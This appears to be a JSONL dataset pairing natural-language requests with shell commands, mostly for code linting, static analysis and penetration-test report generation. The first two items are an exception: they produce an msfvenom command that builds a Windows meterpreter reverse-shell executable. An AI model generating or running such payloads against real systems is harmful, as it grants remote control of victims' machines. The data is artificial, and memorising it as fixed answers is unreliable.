{"input": "Create a payload that avoids null bytes for 192.168.1.100 on port 4444, and save it as payload.exe.", "output": "msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -b '\\x00' -f exe > payload.exe"}
{"input": "Generate a null-byte-free payload using 192.168.1.100:4444 and write the output to payload.exe.", "output": "msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -b '\\x00' -f exe > payload.exe"}
{"input": "Lint JavaScript files in the current directory.", "output": "eslint ."}
{"input": "Perform code linting on the current directory.", "output": "eslint ."}
{"input": "Analyze module.py for errors and style issues.", "output": "pylint module.py"}
{"input": "Perform code linting on module.py for style issues and errors.", "output": "pylint module.py"}
{"input": "Run the SonarQube scanner to perform code quality analysis.", "output": "sonar-scanner"}
{"input": "Kick off a code quality scan using the SonarQube scanner.", "output": "sonar-scanner"}
{"input": "Detect C/C++ bugs in main.c and output the results to report.txt.", "output": "pvs-studio --source-file main.c --output-file report.txt"}
{"input": "Run a bug detection scan on main.c, saving findings into report.txt.", "output": "pvs-studio --source-file main.c --output-file report.txt"}
{"input": "Run Codacy CLI to perform automated code review for code quality.", "output": "codacy-analysis-cli analyze"}
{"input": "Analyze the codebase for code quality issues using the Codacy CLI.", "output": "codacy-analysis-cli analyze"}
{"input": "Perform static analysis of Java code in src using the ruleset at rulesets/java/quickstart.xml.", "output": "pmd check -d src -R rulesets/java/quickstart.xml"}
{"input": "Scan the src directory for bugs and style issues with rulesets/java/quickstart.xml.", "output": "pmd check -d src -R rulesets/java/quickstart.xml"}
{"input": "Check for memory leaks in ./program during memory analysis.", "output": "valgrind --tool=memcheck ./program"}
{"input": "Perform memory analysis on ./program to identify leaks.", "output": "valgrind --tool=memcheck ./program"}
{"input": "Enforce Java coding standards on Main.java using sun_checks.xml.", "output": "checkstyle -c sun_checks.xml Main.java"}
{"input": "Run a code style check on Main.java with the sun_checks.xml configuration.", "output": "checkstyle -c sun_checks.xml Main.java"}
{"input": "Scan the codebase for security vulnerabilities.", "output": "semgrep --config p/r2c-ci scan"}
{"input": "Run a security analysis on the source code to find vulnerabilities.", "output": "semgrep --config p/r2c-ci scan"}
{"input": "Compile program.c with memory error detection for memory analysis.", "output": "gcc -fsanitize=address -g program.c"}
{"input": "Build program.c to analyze memory behavior and catch memory errors.", "output": "gcc -fsanitize=address -g program.c"}
{"input": "Lint module.py for style issues and errors.", "output": "flake8 module.py"}
{"input": "Run a code lint check on module.py.", "output": "flake8 module.py"}
{"input": "Lint the JavaScript file script.js for errors.", "output": "jshint script.js"}
{"input": "Perform code linting on script.js to catch issues.", "output": "jshint script.js"}
{"input": "Perform Python code linting on main.py.", "output": "sonarlint --src main.py"}
{"input": "Run a real-time IDE-style lint on main.py to catch issues.", "output": "sonarlint --src main.py"}
{"input": "Run static analysis on main.c.", "output": "cppcheck --enable=all main.c"}
{"input": "Perform a static code analysis pass on main.c.", "output": "cppcheck --enable=all main.c"}
{"input": "Run static analysis to detect defects and vulnerabilities in the cov-int directory.", "output": "cov-analyze --dir cov-int"}
{"input": "Analyze the code in cov-int for security issues and weaknesses.", "output": "cov-analyze --dir cov-int"}
{"input": "Run deep static analysis on project.", "output": "codesonar analyze project"}
{"input": "Perform static analysis on the codebase named project.", "output": "codesonar analyze project"}
{"input": "Run static analysis to evaluate code quality and security.", "output": "kiuwan analyze"}
{"input": "Perform a code quality scan to identify security and quality issues.", "output": "kiuwan analyze"}
{"input": "Scan the codebase for security issues.", "output": "snyk code test"}
{"input": "Perform security analysis on the source code.", "output": "snyk code test"}
{"input": "Analyze the codebase for quality and security issues.", "output": "deepsource analyze"}
{"input": "Run a code quality check to surface potential security problems.", "output": "deepsource analyze"}
{"input": "Run a behavioral code analysis to assess code quality.", "output": "codescene analyze"}
{"input": "Analyze code quality using behavioral insights.", "output": "codescene analyze"}
{"input": "Run static analysis on main.c.", "output": "clang --analyze main.c"}
{"input": "Perform C/C++ static analysis on main.c.", "output": "clang --analyze main.c"}
{"input": "Run a strict JavaScript lint on script.js.", "output": "jslint script.js"}
{"input": "Perform code linting on script.js to catch quality issues.", "output": "jslint script.js"}
{"input": "Lint and auto-correct the Ruby code in the project.", "output": "rubocop -a"}
{"input": "Run a code linting pass that automatically fixes detected Ruby style issues.", "output": "rubocop -a"}
{"input": "Perform security analysis on app.jar to find vulnerabilities in the Java code.", "output": "veracode scan --file app.jar"}
{"input": "Scan app.jar for Java security issues.", "output": "veracode scan --file app.jar"}
{"input": "Compile Main.java to detect common Java errors during compilation.", "output": "javac -Xplugin:ErrorProne Main.java"}
{"input": "Perform bug detection on Main.java while it compiles.", "output": "javac -Xplugin:ErrorProne Main.java"}
{"input": "Scan the codebase for security vulnerabilities.", "output": "sourceanalyzer -b project -scan"}
{"input": "Perform a security analysis on the source code.", "output": "sourceanalyzer -b project -scan"}
{"input": "Run static analysis on the C/C++/Java project.", "output": "infer run -- make"}
{"input": "Statically analyze the C/C++/Java codebase to detect issues early.", "output": "infer run -- make"}
{"input": "Lint the Dockerfile for best practices.", "output": "hadolint Dockerfile"}
{"input": "Run a code linting review against the Dockerfile.", "output": "hadolint Dockerfile"}
{"input": "Check module.py for security issues in the Python code.", "output": "dlint module.py"}
{"input": "Perform security analysis of module.py to spot potential vulnerabilities.", "output": "dlint module.py"}
{"input": "Scan the Python code in src for security vulnerabilities.", "output": "bandit -r src"}
{"input": "Perform a security analysis of the codebase at src and report any issues.", "output": "bandit -r src"}
{"input": "Run a Python code inspection on module.py with PyCharm.", "output": "pycharm --inspect module.py"}
{"input": "Lint module.py to flag issues during code linting.", "output": "pycharm --inspect module.py"}
{"input": "Analyze C# code for quality issues in solution.sln.", "output": "resharper inspectcode solution.sln"}
{"input": "Check code quality across solution.sln and report issues.", "output": "resharper inspectcode solution.sln"}
{"input": "Lint the Go code to catch issues and bugs in the project.", "output": "golangci-lint run"}
{"input": "Perform code linting on the Go source to spot potential problems.", "output": "golangci-lint run"}
{"input": "Run static analysis on the PHP code in src.", "output": "phpstan analyze src"}
{"input": "Audit src for PHP code issues using static analysis.", "output": "phpstan analyze src"}
{"input": "Run PHP static analysis with type checks and save the results to report.json.", "output": "psalm --report=report.json"}
{"input": "Perform static analysis on the PHP codebase and output the findings into report.json.", "output": "psalm --report=report.json"}
{"input": "Run Qt-oriented static analysis on main.cpp.", "output": "clazy main.cpp"}
{"input": "Check main.cpp for C++ Qt issues via static analysis.", "output": "clazy main.cpp"}
{"input": "Lint the TypeScript sources in src/**/*.ts for errors using the tslint.json configuration.", "output": "tslint -c tslint.json 'src/**/*.ts'"}
{"input": "Run a code lint pass on src/**/*.ts with the config file tslint.json.", "output": "tslint -c tslint.json 'src/**/*.ts'"}
{"input": "Perform static security analysis on the C source file main.c.", "output": "splint main.c"}
{"input": "Assess main.c for code security issues using static analysis.", "output": "splint main.c"}
{"input": "Run formal static analysis on main.c.", "output": "frama-c -val main.c"}
{"input": "Perform a formal code review of main.c via static analysis.", "output": "frama-c -val main.c"}
{"input": "Detect bugs in Java bytecode within Main.class.", "output": "findbugs -textui -effort:max Main.class"}
{"input": "Perform bug detection on Main.class.", "output": "findbugs -textui -effort:max Main.class"}
{"input": "Format and check Perl code style in script.pl.", "output": "perltidy script.pl"}
{"input": "Reformat script.pl and verify its Perl code style.", "output": "perltidy script.pl"}
{"input": "Load project.srctrl to visualize and analyze the C/C++/Java codebase.", "output": "sourcetrail --project-file project.srctrl"}
{"input": "Open project.srctrl for code visualization of the project's structure and relationships.", "output": "sourcetrail --project-file project.srctrl"}
{"input": "Check main.cpp for C++ code style against the Google guide.", "output": "cpplint main.cpp"}
{"input": "Evaluate code style in main.cpp using the Google C++ style rules.", "output": "cpplint main.cpp"}
{"input": "Prepare static analysis for the C/C++/Java codebase.", "output": "kwinject make"}
{"input": "Start a static analysis preparation step for our C/C++/Java sources.", "output": "kwinject make"}
{"input": "Monitor code quality across languages for myproject.", "output": "teamscale analyze --project myproject"}
{"input": "Audit the code quality of myproject across languages.", "output": "teamscale analyze --project myproject"}
{"input": "Perform a security analysis of the PHP code in src.", "output": "rips-cli scan --dir src"}
{"input": "Scan the src directory for PHP security issues.", "output": "rips-cli scan --dir src"}
{"input": "Lint the CSS files matching src/**/*.css for style issues.", "output": "stylelint 'src/**/*.css'"}
{"input": "Perform code linting on src/**/*.css to catch CSS style problems.", "output": "stylelint 'src/**/*.css'"}
{"input": "Lint script.pl to enforce Perl coding best practices.", "output": "perlcritic script.pl"}
{"input": "Review script.pl for code linting violations against Perl best practices.", "output": "perlcritic script.pl"}
{"input": "Convert the Markdown file report.md into the PDF report.pdf.", "output": "pandoc report.md -o report.pdf"}
{"input": "Perform a format conversion of report.md to report.pdf.", "output": "pandoc report.md -o report.pdf"}
{"input": "Export the Metasploit database to XML and save it as report.xml.", "output": "msfconsole -x 'db_export -f xml -o report.xml'"}
{"input": "Generate an XML report from the Metasploit database and output it to report.xml.", "output": "msfconsole -x 'db_export -f xml -o report.xml'"}
{"input": "Run a static analysis scan on the codebase.", "output": "qodana scan"}
{"input": "Perform multiple-language static analysis on this project.", "output": "qodana scan"}
{"input": "Generate an HTML report of metadata findings for example.com.", "output": "metagoofil -d example.com -t pdf -o report.html"}
{"input": "Perform metadata reporting against example.com and produce an HTML results report.", "output": "metagoofil -d example.com -t pdf -o report.html"}
{"input": "Generate a PDF report from Faraday and save it to report.pdf.", "output": "faraday-cli report generate --format pdf --output report.pdf"}
{"input": "Produce the engagement report as report.pdf in PDF via Faraday.", "output": "faraday-cli report generate --format pdf --output report.pdf"}
{"input": "Export the Dradis project to a DOCX file named report.docx.", "output": "dradis --export report.docx"}
{"input": "Generate a report export as report.docx from the Dradis project.", "output": "dradis --export report.docx"}
{"input": "Generate an HTML report from Dradis findings and save it to report.html.", "output": "dradis -o report.html"}
{"input": "Perform report generation to produce report.html from the Dradis findings.", "output": "dradis -o report.html"}
{"input": "Assess code quality and defects in the src directory.", "output": "embold analyze --dir src"}
{"input": "Review the src codebase for quality issues and defects.", "output": "embold analyze --dir src"}
{"input": "Export the scan results for 192.168.1.100 to XML and save them as scan.xml.", "output": "nmap -oX scan.xml 192.168.1.100"}
{"input": "Generate an XML report named scan.xml from scanning 192.168.1.100.", "output": "nmap -oX scan.xml 192.168.1.100"}
{"input": "Export Metasploit findings to a CSV file at report.csv for report export.", "output": "msfconsole -x 'db_export -f csv -o report.csv'"}
{"input": "Generate a CSV report of findings and save it as report.csv.", "output": "msfconsole -x 'db_export -f csv -o report.csv'"}
{"input": "Convert the Markdown file report.md into a DOCX named report.docx.", "output": "pandoc report.md -o report.docx"}
{"input": "Perform format conversion from report.md to the DOCX output report.docx.", "output": "pandoc report.md -o report.docx"}
{"input": "Export Nmap scan results for 192.168.1.100 to a normal text report in scan.txt.", "output": "nmap -oN scan.txt 192.168.1.100"}
{"input": "Perform scan reporting for 192.168.1.100 and write the output to scan.txt as plain text.", "output": "nmap -oN scan.txt 192.168.1.100"}
{"input": "Generate an HTML report from Faraday and save as report.html.", "output": "faraday-cli report generate --format html --output report.html"}
{"input": "Create a Faraday HTML report for report generation, outputting to report.html.", "output": "faraday-cli report generate --format html --output report.html"}
{"input": "Generate a PDF vulnerability report and save it to vuln_report.pdf.", "output": "msfconsole -x 'report -t vulnerability -o vuln_report.pdf'"}
{"input": "Produce the vulnerability report as a PDF named vuln_report.pdf.", "output": "msfconsole -x 'report -t vulnerability -o vuln_report.pdf'"}
{"input": "Convert the Markdown file report.md to report.pdf using XeLaTeX.", "output": "pandoc report.md --pdf-engine=xelatex -o report.pdf"}
{"input": "Perform format conversion of report.md into the PDF report.pdf with XeLaTeX.", "output": "pandoc report.md --pdf-engine=xelatex -o report.pdf"}
{"input": "Export Faraday data to XML and save it as report.xml.", "output": "faraday-cli export --format xml --output report.xml"}
{"input": "Produce an XML report for Faraday and write it to report.xml.", "output": "faraday-cli export --format xml --output report.xml"}
{"input": "Export greppable Nmap results for 192.168.1.100 into scan.grep.", "output": "nmap -oG scan.grep 192.168.1.100"}
{"input": "Create a grep-friendly scan report for 192.168.1.100 saved as scan.grep.", "output": "nmap -oG scan.grep 192.168.1.100"}
{"input": "Export Dradis findings to a CSV file named findings.csv.", "output": "dradis -t csv -o findings.csv"}
{"input": "Do a report export and save it as findings.csv in CSV format.", "output": "dradis -t csv -o findings.csv"}
{"input": "Generate a text report of metadata findings for example.com.", "output": "metagoofil -d example.com -t doc -o report.txt"}
{"input": "Produce metadata reporting results for example.com as a concise text report.", "output": "metagoofil -d example.com -t doc -o report.txt"}
{"input": "Export Metasploit data to report.json as JSON.", "output": "msfconsole -x 'db_export -f json -o report.json'"}
{"input": "Create a report export to report.json in JSON format.", "output": "msfconsole -x 'db_export -f json -o report.json'"}
{"input": "Generate a report from the custom HTML template at custom.html and save it as report.html.", "output": "dradis --template custom.html -o report.html"}
{"input": "Use a custom HTML template (custom.html) to produce a report output to report.html.", "output": "dradis --template custom.html -o report.html"}
{"input": "Convert report.md from Markdown into the HTML file report.html.", "output": "pandoc report.md -o report.html"}
{"input": "Perform format conversion of report.md to generate report.html.", "output": "pandoc report.md -o report.html"}
{"input": "Generate a PDF report from Dradis and save it as report.pdf.", "output": "dradis -o report.pdf"}
{"input": "Export the report to report.pdf using Dradis.", "output": "dradis -o report.pdf"}
{"input": "Generate a CSV report from Faraday and save it as report.csv.", "output": "faraday-cli report generate --format csv --output report.csv"}
{"input": "Export the findings to report.csv in CSV format using Faraday.", "output": "faraday-cli report generate --format csv --output report.csv"}
{"input": "Generate a CSV host report to host_report.csv.", "output": "msfconsole -x 'report -t host -o host_report.csv'"}
{"input": "Export the host report as CSV into host_report.csv.", "output": "msfconsole -x 'report -t host -o host_report.csv'"}
{"input": "Export Faraday data to JSON and save it to report.json.", "output": "faraday-cli export --format json --output report.json"}
{"input": "Generate a JSON report from Faraday and write the output to report.json.", "output": "faraday-cli export --format json --output report.json"}
{"input": "Convert report.docx into a PDF as report.pdf.", "output": "pandoc report.docx -o report.pdf"}
{"input": "Perform format conversion from report.docx to report.pdf.", "output": "pandoc report.docx -o report.pdf"}
{"input": "Export Nmap scan results for 192.168.1.100 to XML with a stylesheet for scan reporting.", "output": "nmap --stylesheet nmap.xsl -oX scan.xml 192.168.1.100"}
{"input": "Generate an XML report with a stylesheet from scanning 192.168.1.100 to support reporting.", "output": "nmap --stylesheet nmap.xsl -oX scan.xml 192.168.1.100"}
{"input": "Create a CSV report of metadata findings for example.com.", "output": "metagoofil -d example.com -t xls -o report.csv"}
{"input": "Perform metadata reporting on example.com and output the results as CSV.", "output": "metagoofil -d example.com -t xls -o report.csv"}
{"input": "Import Nmap XML results from nmap.xml into Dradis.", "output": "dradis --import nmap.xml"}
{"input": "Ingest the nmap.xml scan report into Dradis for data import.", "output": "dradis --import nmap.xml"}
{"input": "Scan 192.168.1.100 and export Nmap results in all formats.", "output": "nmap -oA scan 192.168.1.100"}
{"input": "Create comprehensive scan reporting for 192.168.1.100 with all output formats.", "output": "nmap -oA scan 192.168.1.100"}
{"input": "Export Metasploit data to HTML and save the output as report.html.", "output": "msfconsole -x 'db_export -f html -o report.html'"}
{"input": "Create an HTML report of Metasploit findings and write it to report.html.", "output": "msfconsole -x 'db_export -f html -o report.html'"}
{"input": "Generate a web-friendly XML report from scanning 192.168.1.100.", "output": "nmap -oX scan.xml --webxml 192.168.1.100"}
{"input": "Produce an XML output suitable for web display when reporting the scan of 192.168.1.100.", "output": "nmap -oX scan.xml --webxml 192.168.1.100"}
{"input": "Export the Dradis project to report.json in JSON format.", "output": "dradis -o report.json"}
{"input": "Perform a report export to report.json from the Dradis project.", "output": "dradis -o report.json"}
{"input": "Convert report.html into a PDF file report.pdf as part of format conversion.", "output": "pandoc report.html -o report.pdf"}
{"input": "Transform the HTML report report.html to the PDF output report.pdf.", "output": "pandoc report.html -o report.pdf"}
{"input": "Convert report.md to LaTeX, saving the output as report.tex.", "output": "pandoc report.md -t latex -o report.tex"}
{"input": "Perform format conversion of report.md into LaTeX for reporting, writing to report.tex.", "output": "pandoc report.md -t latex -o report.tex"}
{"input": "Generate an HTML service report and write it to service_report.html.", "output": "msfconsole -x 'report -t service -o service_report.html'"}
{"input": "Produce the service report for this engagement, saving the output as service_report.html.", "output": "msfconsole -x 'report -t service -o service_report.html'"}
{"input": "Import the Metasploit XML results file metasploit.xml into Dradis for data import.", "output": "dradis --import metasploit.xml"}
{"input": "Load metasploit.xml into Dradis to bring in Metasploit scan results.", "output": "dradis --import metasploit.xml"}
{"input": "Export Faraday data to a DOCX file named report.docx.", "output": "faraday-cli export --format docx --output report.docx"}
{"input": "Create a DOCX report from Faraday and save it as report.docx.", "output": "faraday-cli export --format docx --output report.docx"}
{"input": "Generate a report using the custom template.", "output": "faraday-cli report generate --template custom --output report.pdf"}
{"input": "Create a report with the custom template for report generation.", "output": "faraday-cli report generate --template custom --output report.pdf"}
{"input": "Generate an XML report of metadata findings for example.com.", "output": "metagoofil -d example.com -t ppt -o report.xml"}
{"input": "Report metadata for example.com in XML format.", "output": "metagoofil -d example.com -t ppt -o report.xml"}
{"input": "Export verbose Nmap scan results to XML for 192.168.1.100.", "output": "nmap -oX scan.xml -v 192.168.1.100"}
{"input": "Generate an XML report with verbose results for 192.168.1.100.", "output": "nmap -oX scan.xml -v 192.168.1.100"}
{"input": "Generate a CSV credential report and save it to cred_report.csv.", "output": "msfconsole -x 'report -t credential -o cred_report.csv'"}
{"input": "Export the credential report to the file cred_report.csv.", "output": "msfconsole -x 'report -t credential -o cred_report.csv'"}
{"input": "Export the Dradis project to XML and save it as report.xml.", "output": "dradis -o report.xml"}
{"input": "Perform a report export to XML, outputting the Dradis data to report.xml.", "output": "dradis -o report.xml"}
{"input": "Export Nmap scan results for 192.168.1.100 to XML without a stylesheet.", "output": "nmap -oX scan.xml --no-stylesheet 192.168.1.100"}
{"input": "Generate XML output for scan reporting on 192.168.1.100, omitting the stylesheet.", "output": "nmap -oX scan.xml --no-stylesheet 192.168.1.100"}
{"input": "Generate a Markdown report from Faraday and save it to report.md.", "output": "faraday-cli report generate --format markdown --output report.md"}
{"input": "Create the Faraday report in Markdown format and write the output to report.md.", "output": "faraday-cli report generate --format markdown --output report.md"}
{"input": "Generate a detailed HTML vulnerability report and save it to vuln_detail.html.", "output": "msfconsole -x 'report -t vuln_detail -o vuln_detail.html'"}
{"input": "Produce the report and output to vuln_detail.html.", "output": "msfconsole -x 'report -t vuln_detail -o vuln_detail.html'"}
{"input": "Convert report.md to a PDF report.pdf with the title set to 'PenTest Report'.", "output": "pandoc report.md --metadata title='PenTest Report' -o report.pdf"}
{"input": "Transform the Markdown file report.md into report.pdf, applying the 'PenTest Report' metadata title.", "output": "pandoc report.md --metadata title='PenTest Report' -o report.pdf"}
{"input": "Generate a JSON report of all metadata findings for example.com.", "output": "metagoofil -d example.com -t all -o report.json"}
{"input": "Report all discovered document metadata for example.com in JSON format.", "output": "metagoofil -d example.com -t all -o report.json"}
{"input": "Convert the Markdown file report.md into a standalone HTML file report.html.", "output": "pandoc report.md -s -o report.html"}
{"input": "Perform format conversion of report.md to a standalone HTML output named report.html.", "output": "pandoc report.md -s -o report.html"}
{"input": "Export Faraday data to a text report at report.txt.", "output": "faraday-cli export --format txt --output report.txt"}
{"input": "Generate a text export of Faraday findings saved as report.txt.", "output": "faraday-cli export --format txt --output report.txt"}
{"input": "Generate an executive PDF report and write it to exec_report.pdf.", "output": "msfconsole -x 'report -t executive -o exec_report.pdf'"}
{"input": "Create the executive report as a PDF named exec_report.pdf.", "output": "msfconsole -x 'report -t executive -o exec_report.pdf'"}
{"input": "Scan 192.168.1.100 with aggressive timing and save the report as XML to scan.xml.", "output": "nmap -oX scan.xml -T4 192.168.1.100"}
{"input": "For scan reporting, export the 192.168.1.100 results in XML format to scan.xml.", "output": "nmap -oX scan.xml -T4 192.168.1.100"}
